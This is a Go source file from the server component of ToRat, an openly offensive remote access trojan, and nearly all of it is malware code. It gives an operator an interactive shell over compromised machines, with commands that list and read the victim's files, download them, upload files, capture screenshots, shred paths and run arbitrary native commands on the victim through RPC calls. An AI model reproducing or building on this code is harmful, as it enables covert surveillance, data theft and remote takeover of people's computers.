package server

import (
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"

	"github.com/abiosoft/ishell"
	"github.com/lu4p/ToRat/models"
	"github.com/lu4p/shred"
)

// CLIENT SIDE INTERACTIVE SHELL MENU
func (client activeClient) shellClient() {
	fileCompleter := func([]string) []string {
		return client.Dir.Files
	}

	// SET SHELL AND GET WORKING DIR
	shell := ishell.New()
	r := models.Dir{}
	err := client.RPC.Call("API.LS", void, &r)
	if err != nil {
		// TODO: This may cause false positive on edges cases
		client.Dir.Path = "DISCONNECTED"
	}
	client.Dir = r

	shell.SetPrompt(yellow("["+client.Client.Name+"] ") + blue(client.Dir.Path) + "$ ")

	shell.AddCmd(&ishell.Cmd{
		Name: "cd",
		Func: func(c *ishell.Context) {
			client.Cd(c)
			shell.SetPrompt(yellow("["+client.Client.Name+"] ") + blue(client.Dir.Path) + "$ ")
		},
		Completer: fileCompleter,
		Help:      "change the working directory of the client",
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "ls",
		Func: client.ls,
		Help: "list the files in a directory",
	})

	shell.AddCmd(&ishell.Cmd{
		Name:      "cat",
		Func:      client.Cat,
		Help:      "print the content of a file: usage cat <file>",
		Completer: fileCompleter,
	})

	shell.AddCmd(&ishell.Cmd{
		Name:      "down",
		Func:      client.Download,
		Help:      "download a file from the client: usage down <file>",
		Completer: fileCompleter,
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "up",
		Func: client.Upload,
		Help: "upload a file from the cwd of the Server to cwd of the client: usage up <file>",
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "screen",
		Func: client.Screen,
		Help: "take a screenshot of the client and upload it to the server",
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "escape",
		Func: client.runCommand,
		Help: "escape a command and run it natively on client",
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "reconnect",
		Func: func(c *ishell.Context) {
			client.Reconnect(c)
			shell.Close()
		},
		Help: "tell the client to reconnect",
	})

	shell.AddCmd(&ishell.Cmd{
		Name: "exit",
		Func: func(c *ishell.Context) {
			c.Stop()
			shell.Close()
		},
		Help: "background the current session",
	})

	shell.NotFound(client.runCommand)
	shell.Run()
}

// LS REMOTE DIRECTORY
func (client *activeClient) ls(c *ishell.Context) {
	r := models.Dir{}
	err := client.RPC.Call("API.LS", void, &r)
	if err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Encoutered error during list!"))
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
		return
	}
	client.Dir = r
	for _, f := range client.Dir.Files {
		c.Println(f)
	}
}

// CAT REMOTE FILE
func (client *activeClient) Cat(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	var r string
	err := client.RPC.Call("API.Cat", path, &r)
	if err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Could not cat file!"))
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
	}
	c.Println(r)
}

// CHANGE REMOTE DIRECTORY
func (client *activeClient) Cd(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	r := models.Dir{}
	err := client.RPC.Call("API.Cd", path, &r)

	if err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Could not change to that path!"))
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
	}
	client.Dir = r
}

// DOWNLOAD A REMOTE FILE
func (client *activeClient) Download(c *ishell.Context) {
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()
	filename := strings.Join(c.Args, " ")
	var r models.File
	err := client.RPC.Call("API.SendFile", filename, &r)
	if err != nil {
		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Download could not be sent to Server!"))
		c.ProgressBar().Stop()
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
	}
	path := filepath.Join(client.Client.Path, filename)
	err = ioutil.WriteFile(path, r.Content, 0600)
	if err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Download failed to write to path!"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
	}
	c.ProgressBar().Final(green("[Server] ") + green("[+] Download received"))
	c.ProgressBar().Stop()

}

// UPLOAD A FILE FROM SERVER TO CLIENT
func (client *activeClient) Upload(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	info, _ := os.Stat(path)

	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	content, err := ioutil.ReadFile(path)
	if err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed could not read local file!"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
		return
	}

	f := models.File{
		Content: content,
		Path:    path,
		Perm:    info.Mode(),
	}

	err = client.RPC.Call("API.RecvFile", f, &void)
	if err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed!"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
		return
	}

	c.ProgressBar().Final(green("[Server] ") + green("[+] Upload Successful"))
	c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + green("[+] Upload successfully received"))
	c.ProgressBar().Stop()
}

// CAPTURE REMOTE SCREENSHOT
func (client *activeClient) Screen(c *ishell.Context) {
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	filename := getTimeSt() + ".png"
	var r []byte

	err := client.RPC.Call("API.Screen", void, &r)
	if err != nil {
		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Screenshot failed!"))
		c.ProgressBar().Stop()
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
		return
	}
	err = ioutil.WriteFile(filepath.Join(client.Client.Path, filename), r, 0600)
	if err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Screenshot could not be saved"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
		return
	}
	c.ProgressBar().Final(green("[Server] ") + green("[+] Screenshot received"))
	c.ProgressBar().Stop()

}

// FORCE CLIENT RECONNECT
// TODO: I don't think this feature works
func (client *activeClient) Reconnect(c *ishell.Context) {
	var r bool
	client.RPC.Call("API.Reconnect", void, &r)
	c.Stop()
}

// REMOVE FILE
// TODO: Is this used? Where?
func (client *activeClient) Shred(c *ishell.Context) {
	args := models.Shred{
		Conf: shred.Conf{
			Times:  3,
			Zeros:  true,
			Remove: true,
		},
		Path: strings.Join(c.Args, " "),
	}
	var r error
	err := client.RPC.Call("API.Shred", &args, &r)
	if err != nil {
		c.Println(red("[!] Could not shred path:", args.Path, err, r))
	}
}

// PING SOMETHING?
// TODO: I don't think this feature works
func (client *activeClient) Ping(c *ishell.Context) error {
	return client.RPC.Call("API.Ping", void, &void)
}

// RUN A COMMAND ON CLIENT
func (client *activeClient) runCommand(c *ishell.Context) {
	command := strings.Join(c.Args, " ")
	var r string
	args := models.Cmd{
		Cmd:        command,
		Powershell: false,
	}

	err := client.RPC.Call("API.RunCmd", args, &r)
	if err != nil {
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Bad or unkown command!"))
		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
	}

	c.Println(r)
}
